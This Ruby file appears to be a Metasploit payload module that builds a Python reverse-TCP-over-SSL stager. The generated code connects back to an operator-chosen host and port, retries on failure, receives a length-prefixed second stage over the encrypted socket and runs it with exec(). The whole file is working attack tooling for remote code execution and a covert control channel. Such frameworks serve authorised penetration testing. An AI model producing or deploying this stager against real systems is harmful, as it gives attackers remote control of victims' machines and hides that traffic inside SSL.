# -*- coding: binary -*-

require 'msf/core'
require 'msf/core/payload/python/reverse_tcp'

module Msf

###
#
# Complex reverse_tcp_ssl payload generation for Python
#
###

module Payload::Python::ReverseTcpSsl

  include Msf::Payload::Python
  include Msf::Payload::Python::ReverseTcp

  #
  # Generate the first stage
  #
  def generate
    conf = {
      port:        datastore['LPORT'],
      host:        datastore['LHOST'],
      retry_wait:  datastore['StagerRetryWait']
    }

    generate_reverse_tcp_ssl(conf)
  end

  #
  # By default, we don't want to send the UUID, but we'll send
  # for certain payloads if requested.
  #
  def include_send_uuid
    false
  end

  def supports_ssl?
    true
  end

  def generate_reverse_tcp_ssl(opts={})
    # Set up the socket
    cmd  = "import ssl,socket,struct#{datastore['StagerRetryWait'].to_i > 0 ? ',time' : ''}\n"
    if datastore['StagerRetryWait'].blank? # do not retry at all (old style)
      cmd << "so=socket.socket(2,1)\n" # socket.AF_INET = 2
      cmd << "so.connect(('#{opts[:host]}',#{opts[:port]}))\n"
      cmd << "s=ssl.wrap_socket(so)\n"
    else
      cmd << "while 1:\n"
      cmd << "\ttry:\n"
      cmd << "\t\tso=socket.socket(2,1)\n" # socket.AF_INET = 2
      cmd << "\t\tso.connect(('#{opts[:host]}',#{opts[:port]}))\n"
      cmd << "\t\ts=ssl.wrap_socket(so)\n"
      cmd << "\t\tbreak\n"
      cmd << "\texcept:\n"
      if datastore['StagerRetryWait'].to_i <= 0
        cmd << "\t\tpass\n" # retry immediately
      else
        cmd << "\t\ttime.sleep(#{datastore['StagerRetryWait'].to_i})\n" # retry after waiting
      end
    end
    cmd << py_send_uuid if include_send_uuid
    cmd << "l=struct.unpack('>I',s.recv(4))[0]\n"
    cmd << "d=s.recv(l)\n"
    cmd << "while len(d)<l:\n"
    cmd << "\td+=s.recv(l-len(d))\n"
    cmd << "exec(d,{'s':s})\n"

    py_create_exec_stub(cmd)
  end

  def handle_intermediate_stage(conn, payload)
    conn.put([payload.length].pack("N"))
  end

end

end

